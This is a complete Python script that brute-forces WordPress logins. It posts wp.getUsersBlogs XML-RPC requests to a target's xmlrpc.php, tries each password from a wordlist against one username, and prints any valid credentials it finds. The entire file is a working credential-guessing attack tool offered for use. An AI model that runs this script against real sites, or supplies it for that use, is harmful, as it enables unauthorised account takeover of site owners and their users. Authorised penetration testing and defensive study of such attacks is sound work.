import requests
import argparse
import time
import sys

def try_login(url, username, password, user_agent):
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'text/xml'
    }

    xml_payload = f"""
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string>{username}</string></value></param>
            <param><value><string>{password}</string></value></param>
        </params>
    </methodCall>
    """

    try:
        response = requests.post(url, data=xml_payload.strip(), headers=headers, timeout=5)
        if "<name>isAdmin</name>" in response.text:
            print(f"[+] VALID: {username} : {password}")
            return True
        else:
            print(f"[-] Invalid: {username} : {password}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
    return False

def main():
    parser = argparse.ArgumentParser(description="Brute force login via xmlrpc.php (WordPress)")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. https://example.com/xmlrpc.php)")
    parser.add_argument("-U", "--user", required=True, help="Username to test")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("-a", "--agent", default="WPForce-Test/1.0", help="Custom User-Agent (optional)")

    args = parser.parse_args()

    try:
        with open(args.wordlist, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Wordlist not found.")
        sys.exit(1)

    print(f"[*] Starting brute force against {args.user} on {args.url}")
    for pwd in passwords:
        if try_login(args.url, args.user, pwd, args.agent):
            break
        time.sleep(0.2) 

if __name__ == "__main__":
    main()
